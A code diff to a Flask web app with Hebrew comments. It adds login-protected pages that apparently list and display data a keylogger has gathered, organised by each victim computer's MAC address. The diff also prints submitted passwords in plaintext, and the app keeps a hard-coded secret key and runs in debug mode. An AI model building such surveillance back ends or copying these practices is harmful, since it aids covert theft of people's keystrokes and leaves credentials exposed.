@@ -14,7 +14,6 @@ from flask_login import LoginManager, UserMixin, login_user, login_required, log
 
 app.secret_key = "סוד_מאובטח"  # מפתח להצפנה
 
-# הגדרת ניהול התחברות משתמשים
 login_manager = LoginManager()
 login_manager.init_app(app)
 login_manager.login_view = "login"
@@ -35,22 +34,46 @@ def load_user(user_id):
 # עמוד התחברות
 @app.route('/login', methods=['GET', 'POST'])
 def login():
+
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-
+        print(password)
         if username in users and users[username] == password:
             user = User(username)
             login_user(user)
             return redirect(url_for('dashboard'))
 
-    return render_template('login.html')
+    return render_template('index.html')
 
 # עמוד מוגן (דשבורד)
 @app.route('/dashboard')
 @login_required
 def dashboard():
-    return render_template('dashboard.html', username=current_user.id)
+    return render_template('style_navbar.html', username=current_user.id)
+
+
+@app.route('/folders', methods=['GET'])
+@login_required
+def get_folders():
+    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+    try:
+        folders = [f for f in os.listdir(base_dir) if os.path.isdir(os.path.join(base_dir, f))]
+    except Exception as e:
+        folders = []
+
+    return render_template('list_of_folders.html', folders=folders)
+
+
+@app.route('/folders/<folder_name>', methods=['GET'])
+@login_required
+def show_folder_contents(folder_name):
+    base_dir = r"C:\Users\1\Desktop\keylogger\server_data\computers"
+
+    # טוען את התוכן של התיקיה כ-JSON
+    files = load_data(mac_address=str(folder_name))
+    # החזרת הנתונים כ-JSON
+    return jsonify({'folder_name': folder_name, 'files': files})
 
 
 # עמוד התנתקות
@@ -62,9 +85,7 @@ def logout():
 
 
 def load_data(mac_address=None, date=None, root_directory=data_file):
-
         all_data = {}
-
         # בדיקה שהתיקייה הראשית קיימת
         if not os.path.exists(root_directory):
             return all_data
@@ -205,3 +226,4 @@ def health():
 
 if __name__ == '__main__':
     app.run(debug=True)
+print(load_data("d0-39-57-0d-5c-a5"))
